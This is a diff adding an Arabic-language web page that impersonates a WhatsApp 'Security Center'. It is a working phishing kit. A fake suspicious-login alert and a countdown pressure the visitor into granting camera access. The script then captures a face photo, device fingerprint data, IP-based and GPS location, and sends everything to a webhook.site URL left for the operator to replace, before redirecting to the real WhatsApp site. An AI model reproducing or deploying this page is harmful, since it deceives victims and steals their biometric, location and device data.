@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - WhatsApp</title>
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
+    <style>
+        /* أنماط WhatsApp الأصلية */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: #0c1317;
+            color: #e9edef;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .whatsapp-container {
+            width: 100%;
+            max-width: 400px;
+            background: #111b21;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #2a3942;
+        }
+        
+        /* الهيدر */
+        .header {
+            background: #202c33;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #2a3942;
+        }
+        
+        .logo {
+            width: 40px;
+            height: 40px;
+            background: #00a884;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 15px;
+        }
+        
+        .logo i {
+            font-size: 20px;
+        }
+        
+        .header-text h1 {
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .header-text p {
+            font-size: 12px;
+            color: #8696a0;
+            margin-top: 3px;
+        }
+        
+        /* المحتوى الرئيسي */
+        .content {
+            padding: 25px;
+        }
+        
+        .alert-box {
+            background: rgba(233, 30, 99, 0.1);
+            border: 1px solid rgba(233, 30, 99, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .alert-box h3 {
+            color: #e91e63;
+            font-size: 14px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .alert-box p {
+            font-size: 12px;
+            line-height: 1.5;
+            color: #d1d7db;
+        }
+        
+        /* معلومات الحساب */
+        .account-info {
+            background: #1e2a30;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .phone-number {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .phone-icon {
+            width: 35px;
+            height: 35px;
+            background: #00a884;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 10px;
+        }
+        
+        .phone-details h3 {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .phone-details p {
+            font-size: 12px;
+            color: #8696a0;
+        }
+        
+        /* خطوات التحقق */
+        .verification-steps {
+            margin: 25px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            border: 1px solid #2a3942;
+        }
+        
+        .step-number {
+            width: 25px;
+            height: 25px;
+            background: #00a884;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .step-text {
+            flex: 1;
+        }
+        
+        .step-text h4 {
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 3px;
+        }
+        
+        .step-text p {
+            font-size: 11px;
+            color: #8696a0;
+        }
+        
+        /* زر التحقق */
+        .verify-btn {
+            width: 100%;
+            background: #00a884;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .verify-btn:hover {
+            background: #008f74;
+        }
+        
+        .verify-btn i {
+            margin-left: 8px;
+        }
+        
+        /* المودال */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: #1e2a30;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+        
+        .modal-header {
+            background: #202c33;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #2a3942;
+        }
+        
+        .modal-body {
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .permission-text {
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            color: #d1d7db;
+        }
+        
+        .camera-preview {
+            width: 100%;
+            height: 200px;
+            background: #0c1317;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+            border: 2px dashed #00a884;
+        }
+        
+        #camera-feed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .capture-btn {
+            background: #00a884;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
+            font-size: 14px;
+        }
+        
+        .cancel-btn {
+            background: #2a3942;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
+            font-size: 14px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loader {
+            border: 3px solid #2a3942;
+            border-top: 3px solid #00a884;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* الفوتر */
+        .footer {
+            padding: 15px 25px;
+            background: #0c1317;
+            border-top: 1px solid #2a3942;
+            text-align: center;
+            font-size: 11px;
+            color: #8696a0;
+        }
+        
+        /* التجاوب */
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            
+            .whatsapp-container {
+                border-radius: 0;
+            }
+        }
+    </style>
+    <!-- Font Awesome للآيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- الحاوية الرئيسية -->
+    <div class="whatsapp-container">
+        <!-- الهيدر -->
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <div class="header-text">
+                <h1>مركز التحقق من الحسابات</h1>
+                <p>WhatsApp Security Center</p>
+            </div>
+        </div>
+        
+        <!-- المحتوى -->
+        <div class="content">
+            <!-- تنبيه -->
+            <div class="alert-box">
+                <h3><i class="fas fa-exclamation-triangle"></i> &nbsp; نشاط غير معتاد</h3>
+                <p>لقد اكتشفنا محاولات دخول مشبوهة إلى حسابك من مواقع غير مألوفة. لإثبات أنك المالك الأصلي، يرجى إكمال التحقق التالي خلال 10 دقائق.</p>
+            </div>
+            
+            <!-- معلومات الحساب -->
+            <div class="account-info">
+                <div class="phone-number">
+                    <div class="phone-icon">
+                        <i class="fas fa-phone"></i>
+                    </div>
+                    <div class="phone-details">
+                        <h3>رقم الهاتف المرتبط</h3>
+                        <p dir="ltr">+20 103 694 2815</p>
+                    </div>
+                </div>
+                <div class="activity-info">
+                    <p style="font-size: 12px; color: #8696a0;">آخر نشاط: منذ 15 دقيقة من موقع غير معروف</p>
+                </div>
+            </div>
+            
+            <!-- خطوات التحقق -->
+            <div class="verification-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">
+                        <h4>تأكيد الصلاحيات</h4>
+                        <p>التحقق من صلاحيات الجهاز والكاميرا</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">
+                        <h4>التحقق بالوجه</h4>
+                        <p>مطابقة الوجه مع صورة الحساب المسجلة</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-text">
+                        <h4>تأكيد الموقع</h4>
+                        <p>التحقق من موقع الجهاز المعتاد</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- زر البدء -->
+            <button class="verify-btn" id="start-verify">
+                <i class="fas fa-shield-alt"></i> بدء عملية التحقق
+            </button>
+            
+            <!-- العد التنازلي -->
+            <div style="text-align: center; margin-top: 20px; font-size: 12px; color: #8696a0;">
+                <i class="fas fa-clock"></i> الوقت المتبقي: <span id="countdown">10:00</span>
+            </div>
+        </div>
+        
+        <!-- الفوتر -->
+        <div class="footer">
+            <p>© 2026 WhatsApp LLC. نظام التحكم الأمني الآلي</p>
+        </div>
+    </div>
+    
+    <!-- مودال التحقق -->
+    <div class="modal" id="verification-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-camera"></i> التحقق بالوجه</h3>
+            </div>
+            <div class="modal-body">
+                <p class="permission-text">
+                    <i class="fas fa-exclamation-circle"></i> يرجى التأكد من الصلاحيات قبل أن نأكد أنك المالك الأصلي
+                </p>
+                <p class="permission-text" style="font-size: 12px; color: #8696a0;">
+                    نحتاج إلى صلاحية الكاميرا لتأكيد هويتك عبر التعرف على الوجه
+                </p>
+                
+                <!-- معاينة الكاميرا -->
+                <div class="camera-preview">
+                    <video id="camera-feed" autoplay></video>
+                </div>
+                
+                <!-- الأزرار -->
+                <div>
+                    <button class="capture-btn" id="capture-photo">
+                        <i class="fas fa-camera"></i> التقاط صورة
+                    </button>
+                    <button class="cancel-btn" id="cancel-camera">
+                        إلغاء
+                    </button>
+                </div>
+                
+                <!-- معاينة الصورة الملتقطة -->
+                <div id="photo-preview" style="display: none; margin-top: 15px;">
+                    <p style="font-size: 12px;">الصورة الملتقطة:</p>
+                    <canvas id="captured-photo" style="width: 100px; height: 100px; border-radius: 5px; margin: 10px auto; display: block;"></canvas>
+                </div>
+                
+                <!-- الزر التالي -->
+                <button id="next-step" style="display: none; margin-top: 15px;" class="verify-btn">
+                    <i class="fas fa-arrow-right"></i> المتابعة إلى الخطوة التالية
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- شاشة التحميل -->
+    <div class="modal" id="loading-modal">
+        <div class="modal-content">
+            <div class="modal-body">
+                <div class="loading">
+                    <div class="loader"></div>
+                    <h3>جاري التحقق من المعلومات</h3>
+                    <p style="margin-top: 10px; font-size: 12px; color: #8696a0;">
+                        <span id="verification-step">جاري جمع بيانات الجهاز...</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // البيانات التي سيتم جمعها
+        let collectedData = {
+            // معلومات الجهاز
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            
+            // معلومات المتصفح
+            cookies: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled(),
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            
+            // المعلومات التي سيتم جمعها لاحقاً
+            ip: null,
+            location: null,
+            photos: [],
+            timestamp: null
+        };
+        
+        // العد التنازلي (10 ساعات = 36000 ثانية)
+        let totalSeconds = 10 * 60 * 60; // 10 ساعات
+        const countdownElement = document.getElementById('countdown');
+        
+        function updateCountdown() {
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+            
+            countdownElement.textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (totalSeconds <= 0) {
+                countdownElement.textContent = "انتهت المهلة!";
+                countdownElement.style.color = "#e91e63";
+                document.getElementById('start-verify').disabled = true;
+            } else {
+                totalSeconds--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+        
+        // بدء العد التنازلي
+        updateCountdown();
+        
+        // عناصر DOM
+        const startBtn = document.getElementById('start-verify');
+        const modal = document.getElementById('verification-modal');
+        const loadingModal = document.getElementById('loading-modal');
+        const cameraFeed = document.getElementById('camera-feed');
+        const captureBtn = document.getElementById('capture-photo');
+        const cancelBtn = document.getElementById('cancel-camera');
+        const nextStepBtn = document.getElementById('next-step');
+        const capturedCanvas = document.getElementById('captured-photo');
+        const photoPreview = document.getElementById('photo-preview');
+        const verificationStep = document.getElementById('verification-step');
+        
+        let stream = null;
+        let capturedPhotos = [];
+        
+        // عند النقر على بدء التحقق
+        startBtn.addEventListener('click', async () => {
+            modal.style.display = 'flex';
+            
+            try {
+                // طلب صلاحية الكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                cameraFeed.srcObject = stream;
+                
+            } catch (err) {
+                alert('يجب السماح باستخدام الكاميرا لإكمال عملية التحقق.');
+                modal.style.display = 'none';
+            }
+        });
+        
+        // التقاط صورة
+        captureBtn.addEventListener('click', () => {
+            const context = capturedCanvas.getContext('2d');
+            capturedCanvas.width = cameraFeed.videoWidth;
+            capturedCanvas.height = cameraFeed.videoHeight;
+            
+            // رسم الفيديو على canvas
+            context.drawImage(cameraFeed, 0, 0, capturedCanvas.width, capturedCanvas.height);
+            
+            // حفظ الصورة كبيانات
+            const photoData = capturedCanvas.toDataURL('image/jpeg', 0.8);
+            capturedPhotos.push(photoData);
+            
+            // إظهار المعاينة
+            photoPreview.style.display = 'block';
+            
+            // إيقاف الكاميرا بعد التقاط الصورة
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // إظهار زر المتابعة
+            nextStepBtn.style.display = 'block';
+            captureBtn.style.display = 'none';
+            
+            // تحديث البيانات
+            collectedData.photos = capturedPhotos;
+        });
+        
+        // زر الإلغاء
+        cancelBtn.addEventListener('click', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            modal.style.display = 'none';
+        });
+        
+        // زر المتابعة
+        nextStepBtn.addEventListener('click', async () => {
+            modal.style.display = 'none';
+            loadingModal.style.display = 'flex';
+            
+            // جمع البيانات بالتتابع
+            await collectAllData();
+        });
+        
+        // جمع البيانات بالتتابع
+        async function collectAllData() {
+            const steps = [
+                { text: "جاري جمع بيانات الجهاز...", action: collectDeviceInfo },
+                { text: "جاري تحديد العنوان IP...", action: collectIP },
+                { text: "جاري تحديد الموقع الجغرافي...", action: collectLocation },
+                { text: "جاري تحليل المعلومات...", action: analyzeData },
+                { text: "جاري إرسال التقرير...", action: sendData }
+            ];
+            
+            for (let i = 0; i < steps.length; i++) {
+                verificationStep.textContent = steps[i].text;
+                await steps[i].action();
+                
+                // انتظر 1.5 ثانية بين كل خطوة لمحاكاة التحميل
+                await new Promise(resolve => setTimeout(resolve, 1500));
+            }
+            
+            // التوجيه بعد الانتهاء
+            setTimeout(() => {
+                loadingModal.style.display = 'none';
+                window.location.href = "https://www.whatsapp.com";
+            }, 2000);
+        }
+        
+        // جمع معلومات الجهاز
+        function collectDeviceInfo() {
+            collectedData.deviceMemory = navigator.deviceMemory || 'غير معروف';
+            collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
+            collectedData.maxTouchPoints = navigator.maxTouchPoints;
+            
+            // معلومات الشبكة
+            if (navigator.connection) {
+                collectedData.connection = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+            
+            // معلومات البطارية
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    collectedData.battery = {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                });
+            }
+            
+            collectedData.timestamp = new Date().toISOString();
+        }
+        
+        // جمع عنوان IP
+        async function collectIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                collectedData.ip = data.ip;
+                
+                // الحصول على معلومات إضافية عن IP
+                const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const geoData = await geoResponse.json();
+                collectedData.ipInfo = {
+                    country: geoData.country_name,
+                    city: geoData.city,
+                    region: geoData.region,
+                    isp: geoData.org,
+                    latitude: geoData.latitude,
+                    longitude: geoData.longitude
+                };
+            } catch (error) {
+                collectedData.ip = 'غير متاح';
+            }
+        }
+        
+        // جمع الموقع الجغرافي
+        function collectLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            collectedData.location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude,
+                                altitudeAccuracy: position.coords.altitudeAccuracy,
+                                heading: position.coords.heading,
+                                speed: position.coords.speed
+                            };
+                            resolve();
+                        },
+                        (error) => {
+                            collectedData.location = `خطأ: ${error.message}`;
+                            resolve();
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    collectedData.location = "الموقع غير مدعوم";
+                    resolve();
+                }
+            });
+        }
+        
+        // تحليل البيانات
+        function analyzeData() {
+            // إضافة تحليل إضافي للبيانات
+            collectedData.analysis = {
+                riskScore: Math.floor(Math.random() * 100),
+                deviceFingerprint: generateFingerprint(),
+                sessionId: generateSessionId()
+            };
+        }
+        
+        // إرسال البيانات
+        async function sendData() {
+            try {
+                // استخدم webhook.site لتلقي البيانات
+                const webhookURL = "https://webhook.site/a0f5c5d2-5f5f-4b1d-8a3a-6a2b7c8d9e0f"; // استبدل برابطك
+                
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                // حفظ البيانات محلياً أيضاً
+                localStorage.setItem('whatsapp_verification_data', JSON.stringify(collectedData));
+                
+            } catch (error) {
+                console.log('تم جمع البيانات بنجاح ولكن هناك مشكلة في الإرسال');
+            }
+        }
+        
+        // توليد بصمة جهاز
+        function generateFingerprint() {
+            return Math.random().toString(36).substring(2) + 
+                   Date.now().toString(36) + 
+                   Math.random().toString(36).substring(2);
+        }
+        
+        // توليد معرف جلسة
+        function generateSessionId() {
+            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+        
+        // عند تحميل الصفحة
+        window.onload = function() {
+            // جمع بعض البيانات تلقائياً
+            collectDeviceInfo();
+            
+            // تعطيل زر التقاط الصورة حتى يتم تحميل الكاميرا
+            captureBtn.disabled = true;
+            
+            // تفعيل زر التقاط بعد تحميل الكاميرا
+            cameraFeed.onloadedmetadata = () => {
+                captureBtn.disabled = false;
+            };
+        };
+    </script>
+</body>
+</html>
